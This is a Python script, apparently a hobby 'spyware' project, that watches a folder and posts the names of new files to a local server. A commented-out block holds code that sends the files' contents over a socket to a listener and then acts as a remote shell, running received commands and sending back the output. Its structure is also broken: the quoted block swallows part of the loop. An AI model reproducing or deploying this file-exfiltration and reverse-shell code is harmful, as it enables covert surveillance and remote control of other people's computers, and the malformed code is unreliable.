import socket
import subprocess, os
import requests

HOST = "127.0.0.1"
PORT = 12345

connection_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)


while True:
    path_to_watch = "D:\marvel\docker_spyware"
    print('Your folder path is"', path_to_watch,'"')
    before = dict ([(f, None) for f in os.listdir (path_to_watch)])
    while 1:
        after = dict ([(f, None) for f in os.listdir (path_to_watch)])
        added = [f for f in after if not f in before]
        if added:
                
                x =requests.post('http://localhost:3000/', data={'file': added[0]})
                print(x.text)
                break
                
                '''
                connection_socket.connect((HOST, PORT))
                print("Added: ", ", ".join (added))
                connection_socket.send(added[0].encode())
                is_file = os.path.isfile(path_to_watch+ "\\" + added[0])
                if (is_file):
                     print(is_file)
                myfile = open(path_to_watch+ "\\" + added[0], 'rb')
                bytes = myfile.read()
                connection_socket.sendall(bytes)
                print('successfully sent')
                myfile.close()
                break
        else:
             before = after
    command = connection_socket.recv(1024).decode()

    if command == "q":
        break

    if command.split()[0] == "cd":
        os.chdir(command.split()[1])
        connection_socket.send((("Changed the directory to "+ os.getcwd()).encode()))

    else:
        shell_execution = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value = shell_execution.stdout.read()+ shell_execution.stdout.read()
        connection_socket.send(stdout_value) '''
    
connection_socket.close()